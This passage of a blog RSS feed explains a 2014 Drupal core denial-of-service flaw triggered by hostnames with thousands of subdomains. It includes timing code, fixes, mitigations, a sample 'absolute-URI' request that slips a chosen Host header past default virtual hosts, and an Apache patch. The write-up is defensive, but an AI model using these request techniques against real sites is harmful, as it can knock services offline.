            &lt;span class=&quot;nv&quot;&gt;$conf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$confdir&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$dir&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$conf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$conf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$confdir&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/default&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$conf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;What this code does is testing the requested hostname to see if a specific settings directory exists for this Host; this is the &lt;strong&gt;core functionality of drupal multisites&lt;/strong&gt;. By default you have the &lt;em&gt;default&lt;/em&gt; settings in the directory &lt;code&gt;&amp;lt;www&amp;gt;/sites/default&lt;/code&gt;, you can then use a &lt;code&gt;&amp;lt;www&amp;gt;/sites/sites.php&lt;/code&gt; file to map hostnames with other settings files -- but this will only cover names that you &lt;strong&gt;do&lt;/strong&gt; have, not the bad ones --, and you &lt;em&gt;can&lt;/em&gt; also have some directories based on the hostname, or part of it, containing a &lt;code&gt;settings.php&lt;/code&gt; file. Note that you &lt;strong&gt;cannot suspend this multisite feature&lt;/strong&gt;, it's always there, no opt-in or opt-out until Drupal 8 release.&lt;/p&gt;

&lt;p&gt;If the hostname is &lt;code&gt;www.example.com:8080&lt;/code&gt; and the bootstraped drupal file is &lt;code&gt;&amp;lt;www&amp;gt;/index.php&lt;/code&gt;, Drupal will check for theses files (in this order):&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;www/sites/8080.www.example.com/settings.php&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;www/sites/www.example.com/settings.php&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;www/sites/example.com/settings.php&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;www/sites/com/settings.php&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;www/sites/www.example.com/settings.php&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;www/sites/default/settings.php&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;If the hostname is &lt;code&gt;www.example.com:8080&lt;/code&gt; and the bootstraped drupal file is &lt;code&gt;www/modules/statistics/statistics.php&lt;/code&gt;, Drupal will check theses files:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;www/sites/8080.www.example.com.modules.statistics/settings.php&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;www/sites/www.example.com.modules.statistics/settings.php&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;www/sites/example.com.modules.statistics/settings.php&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;www/sites/com.modules.statistics/settings.php&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;www/sites/8080.www.example.com.modules/settings.php&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;www/sites/www.example.com.modules/settings.php&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;www/sites/example.com.modules/settings.php&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;www/sites/com.modules/settings.php&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;www/sites/8080.www.example.com/settings.php&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;www/sites/www.example.com/settings.php&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;www/sites/example.com/settings.php&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;www/sites/com/settings.php&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;www/sites/default/settings.php&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;Yep, I'm not sure anyone is really using that feature, but that's what this code does.&lt;/p&gt;

&lt;p&gt;If one file is found before the default one, then it is used, you can alter settings in this file to connect another database, or use another &lt;code&gt;base_url&lt;/code&gt; or &lt;code&gt;database_prefix&lt;/code&gt;, or alter any setting in fact, the multisites feature things.&lt;/p&gt;

&lt;p&gt;As you can see using the &lt;code&gt;sites/sites.php&lt;/code&gt; to set your hostname-to-directory mapping is quite certainly a good thing to do in terms of performances (this search loop is avoided). Remember that theses file checks are done for &lt;strong&gt;every&lt;/strong&gt; HTTP requests received by Drupal.&lt;/p&gt;

&lt;p&gt;Now re-read the patch, before this patch very long hostnames could be used, and you could use a very big number of subdomains... and for each subdomain you add several locations to check for a setting file...&lt;/p&gt;

&lt;p&gt;This is where I came and then I made some evil tests to see how this multisite code would react with bad hostnames. Working only with the allowed characters (alphabetical letters, digits, dots, &lt;code&gt;:&lt;/code&gt;) we can at least play with this deep settings files search. And the &lt;code&gt;sites.php&lt;/code&gt; map shortcuts won't be used for bad hostnames.&lt;/p&gt;

&lt;h3&gt;And then the DOS issue&lt;/h3&gt;

&lt;p&gt;So, you may think the issue is on the &lt;code&gt;file_exists&lt;/code&gt; calls, as we will run several thousands of file_exists, searching for the first match if we set a hostname with a lot of subdomains. Strangely this is usually quite fast.&lt;/p&gt;

&lt;p&gt;The real issue is on &lt;code&gt;array_slice&lt;/code&gt;, performing several thousands of inverted array_slice is &lt;em&gt;really very very slow&lt;/em&gt;. The first ones are quite fast but the last steps are longer, and we will make several thousands of array_slice operations.&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;test_array_slice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;ARRAY_SLICE array of &amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot; elts =&amp;gt; &amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$time_start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;microtime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;nb&quot;&gt;array_slice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$time_end&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;microtime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$time&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$time_end&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$time_start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;time for array_slice to &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$j&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; : &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$time&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; (s)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/*&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;    ARRAY_SLICE array of 16000 elts =&amp;gt; time for array_slice to -10    : 0.0004069805 (s)&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;    ARRAY_SLICE array of 16000 elts =&amp;gt; time for array_slice to -100   : 0.0004091262 (s)&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;    ARRAY_SLICE array of 16000 elts =&amp;gt; time for array_slice to -500   : 0.0004727840 (s)&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;    ARRAY_SLICE array of 16000 elts =&amp;gt; time for array_slice to -1000  : 0.0005030632 (s)&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;    ARRAY_SLICE array of 16000 elts =&amp;gt; time for array_slice to -4000  : 0.0010337829 (s)&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;    ARRAY_SLICE array of 16000 elts =&amp;gt; time for array_slice to -8000  : 0.0016450881 (s)&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;    ARRAY_SLICE array of 16000 elts =&amp;gt; time for array_slice to -12000 : 0.0018289089 (s)&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;    ARRAY_SLICE array of 16000 elts =&amp;gt; time for array_slice to -14000 : 0.0025160312 (s)&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;    ARRAY_SLICE array of 16000 elts =&amp;gt; time for array_slice to -16000 : 0.0032360553 (s)&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;    */&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;0.003s seems quite fast, but that's already 7.5 times more than the first array_slices. I made a simple graph to show theses times growth.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/theme/img/posts/graph_array_slice.png&quot; width=&quot;600&quot; height=&quot;463&quot; alt=&quot;array_slice time graph for 16000 elements&quot;/&gt;&lt;/p&gt;

&lt;p&gt;And each of theses times are computed for &lt;strong&gt;1 extraction&lt;/strong&gt; -- like extracting the array of 16 000 elements to index -12 000 --, but the loop is extracting all values. One at each call of the loop.&lt;/p&gt;

&lt;p&gt;The loop is &lt;strong&gt;stacking&lt;/strong&gt; each of theses times, with 16 000 elements the last array_slice is 0.003s but the sum of all theses &lt;code&gt;array_slice&lt;/code&gt; calls is ... &lt;strong&gt;52 seconds!&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;My first fix used an &lt;code&gt;array_walk&lt;/code&gt; call to prepare all names that should be checked, instead of rebuilding this name on the loop, this way:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
    &lt;span class=&quot;sd&quot;&gt;/**&lt;/span&gt;
&lt;span class=&quot;sd&quot;&gt;     * Apply this function with an array_walk to obtain an array with names that&lt;/span&gt;
&lt;span class=&quot;sd&quot;&gt;     * need to be tested.&lt;/span&gt;
&lt;span class=&quot;sd&quot;&gt;     */&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;prepare_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$current&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$current&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$val&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$val&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;.&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$current&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$current&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$rev_server&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;array_reverse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$current&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;array_walk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$rev_server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;prepare_name&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$current&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$work_server&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;array_reverse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$rev_server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// --end new&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;c1&quot;&gt;// now the loop is a simple foreach name on first array&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;foreach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$work_server&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$k&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$dir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;implode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;array_slice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And this fixed the performance issue (when &lt;code&gt;file_exists&lt;/code&gt; is fast). But preventing bad hostnames as we have in the final fix is a better fix, more radical, no good reason to manage several thousand of subdomains.&lt;/p&gt;

&lt;p&gt;Is this a real DOS issue? Well, on real life production servers, with a lot of memory and very fast CPUs we've made exploits which usually made any (unique) request run in this loop for more than &lt;strong&gt;2 minutes&lt;/strong&gt;. So with an attacker running parallel requests or reaching some cheaper hosts, this could really become a problem.&lt;/p&gt;

&lt;h2&gt;Protect your website&lt;/h2&gt;

&lt;p&gt;Things that &lt;strong&gt;DO NOT&lt;/strong&gt; protect you, &lt;strong&gt;theses things will not protect your Drupal website from being attacked&lt;/strong&gt;:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Not having a &lt;strong&gt;multisite drupal&lt;/strong&gt;, this happens on the multisite check and you cannot suspend it on D5, D6 and D7 (opt-in for D8, at last), you &lt;strong&gt;always&lt;/strong&gt; have this &lt;code&gt;conf_path()&lt;/code&gt; running, on every request, and you cannot do anything before the settings are loaded.&lt;/li&gt;
&lt;li&gt;Not having drupal on the &lt;strong&gt;Default Virtualhost&lt;/strong&gt;, the &lt;strong&gt;absolute-URI&lt;/strong&gt; trick will hit you, see last part.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Old Drupal&lt;/strong&gt;, this issue is present from a very very long time, also present in Drupal5 for example.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Varnish, Nginx, Apache&lt;/strong&gt; (and maybe others): no default protection.&lt;/li&gt;
&lt;li&gt;Using the &lt;code&gt;www/sites.php&lt;/code&gt; hostname location mapping file, as you will not have the bad hostnames there and you have no way in drupal to reject undefined names.&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;Things &lt;strong&gt;THAT MAY WORK&lt;/strong&gt; to protect yourself (untested):&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;using &lt;strong&gt;mod_security&lt;/strong&gt; or some other security tool checking for some strange Host headers, but you should check the behavior of theses tools with the absolute-URI trick (see last part).&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;Things &lt;strong&gt;THAT DO WORK&lt;/strong&gt; to protect yourself (choose one):&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Upgrade &lt;a href=&quot;https://www.drupal.org/drupal-6.32-release-notes&quot;&gt;D6&lt;/a&gt; or [D7][DRUPAL_7] to the last versions &lt;em&gt;OR&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;Apply the &lt;a href=&quot;https://www.drupal.org/files/issues/sec-D7-conf-path-dos-105258-23.patch&quot;&gt;DOS patch&lt;/a&gt; &lt;em&gt;OR&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;use a default catch-all non-drupal Virtualhost &lt;strong&gt;and&lt;/strong&gt; &lt;a href=&quot;https://issues.apache.org/bugzilla/show_bug.cgi?id=56718&quot;&gt;patch Apache&lt;/a&gt; (see at the end) &lt;em&gt;OR&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;Add a &lt;strong&gt;mod_rewrite&lt;/strong&gt; &lt;em&gt;Hostname check&lt;/em&gt; :&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;The Mod_rewrite Apache module will receive the same &lt;strong&gt;HOSTNAME&lt;/strong&gt; as PHP in the &lt;strong&gt;HTTP_HOST&lt;/strong&gt; variable. If the Absolute-URI trick is used mod_rewrite could detect bad hostname and reject the request. Let's say you have one or two valid DNS for your Drupal websites (here &lt;code&gt;foo.example.com&lt;/code&gt; and &lt;code&gt;bar.example.com&lt;/code&gt;), then check Apache made the right job and reached your Drupal with theses valid names:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-apache&quot; data-lang=&quot;apache&quot;&gt;&lt;span class=&quot;c&quot;&gt;# Reject with a 403 any hostname wich is not in our list of supported domains&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;RewriteCond&lt;/span&gt; %{HTTP_HOST} !^foo\.example\.com$
    &lt;span class=&quot;nb&quot;&gt;RewriteCond&lt;/span&gt; %{HTTP_HOST} !^bar\.example\.com$
    &lt;span class=&quot;nb&quot;&gt;RewriteRule&lt;/span&gt; .* - [F,L]&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;The absolute-URI trick?&lt;/h2&gt;

&lt;p&gt;So, as I said before the default Virtualhost method does not protect you, that's sad because it's usually a good practice, you add a default Virtualhost with default simple pages (like an &quot;It Works&quot; page) and anyone doing bad things with HOST headers would end there.&lt;/p&gt;

&lt;p&gt;But this can be bypassed with both Apache and Nginx by using the absolute-URI trick describe at the end of the &lt;a href=&quot;http://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html&quot;&gt;Practical Host Header attacks paper&lt;/a&gt; that I linked before.&lt;/p&gt;

&lt;p&gt;The trick is to use an absolute URI in the first part of the HTTP query. Instead of the classical HTTP 1.1 request :&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;GET /page/foo?z=42 HTTP/1.1
Host: www.example.com
(other headers)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;You do:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;GET http://www.example.com/page/foo?z=42 HTTP/1.1
Host: something.else
(other headers)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And the RFC 2616 says this request should be managed by the &lt;code&gt;www.example.com&lt;/code&gt; virtualhost, that's OK. And it also states that the Host Header should then be &lt;strong&gt;ignored&lt;/strong&gt;. Cool. But in both Apache and Nginx this does not means the used Host headers will not be sent to the final application (here PHP).&lt;/p&gt;

&lt;p&gt;At the end Drupal receive the Host header (here &lt;code&gt;something.else&lt;/code&gt;). I think this is an issue on the HTTP server side. This header should be overwritten and should look like &lt;code&gt;www.example.com&lt;/code&gt;. What's worse is that classical bad characters that are usually detected in the Host headers are not checked in Apache when you use the Abolute-URI trick. On the drupal side we have the regex cleanup on the Host header, that's a very good thing (&lt;a href=&quot;http://en.wikipedia.org/wiki/Defense_in_depth_%28computing%29&quot;&gt;defense in depth&lt;/a&gt; applied). On the drupal side using the absolute-URI trick will produce a 404 page, the URL does not match any known Drupal path, but this 404 is not a problem for the DOS attack which occurs on the settings file search, very early.&lt;/p&gt;

&lt;p&gt;If you think this is an Apache issue please vote for this &lt;a href=&quot;https://issues.apache.org/bugzilla/show_bug.cgi?id=56718&quot;&gt;Apache patch&lt;/a&gt; on the httpd bugtracker, which overwrite the HTTP_HOST with the absolute-uri host :&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;--- server/protocol.c   2014-03-10 14:04:03.000000000 +0100
+++ server/protocol.c.new   2014-06-05 23:41:38.233573966 +0200
@@ -1063,6 +1063,21 @@

     apr_brigade_destroy(tmp_bb);

+    /*
+    * rfc2616: If Request-URI is an absoluteURI, the host is part of the
+    * Request-URI. Any Host header field value in the request MUST be
+    * ignored.
+    * We are currently ignoring it, but the Host headers are still present
+    * and may get use by naive programs as the one used for vhost choice
+    * or like a valid hostname. So enforce the 'ignore' behavior by
+    * overwritting any present Host header.
+    * Note that this is made just before the fixHostname(r) call, so this
+    * Host header entry is still not as safe as the hostname.
+    */
+    if (r-&amp;gt;hostname &amp;amp;&amp;amp; apr_table_get(r-&amp;gt;headers_in, &quot;Host&quot;)) {
+        apr_table_set(r-&amp;gt;headers_in, &quot;Host&quot;, r-&amp;gt;hostname);
+    }
+
     /* update what we think the virtual host is based on the headers we've
      * now read. may update status.
      */
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;With this patch applied the only way to get a strange Hostname targeted to your Drupal would be having the Drupal Apache Virtualhost used as default Virtualhost, something usually quite easy to fix.&lt;/p&gt;

&lt;p&gt;Nginx may also need a fix one day.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://twitter.com/regilero&quot;&gt;Stay tuned on twitter, @regilero&lt;/a&gt;, &lt;a href=&quot;https://twitter.com/makinacorpus&quot;&gt;@makinacorpus&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
				<published>2014-09-19 00:00:00 +0200</published>
				<link>http://regilero.github.io/security/english/2014/09/19/drupal-details_ofdrupal_sa_core_2014_003_dos/</link>
			</item>
		
			<item>
				<title>SaltStack, Use more than ascii7 on sls files with yaml_utf8 option</title>
				<description>&lt;p&gt;&lt;strong&gt;Warning&lt;/strong&gt;: &lt;em&gt;this option is only available on the &lt;code&gt;2014-01&lt;/code&gt; branch or the &lt;code&gt;develop&lt;/code&gt; branch, it's not yet available on the 0.17 releases branch.&lt;/em&gt;&lt;/p&gt;

&lt;h2&gt;Special characters?&lt;/h2&gt;

&lt;p&gt;DevOps, developpers and sysadmins are usually nice people. They usually knows that most of the computer's tools they use are made by US people and that using nasty things such as spaces or, nastier, special characters like &lt;code&gt;é&lt;/code&gt; or &lt;code&gt;한&lt;/code&gt; may break their tools.&lt;/p&gt;

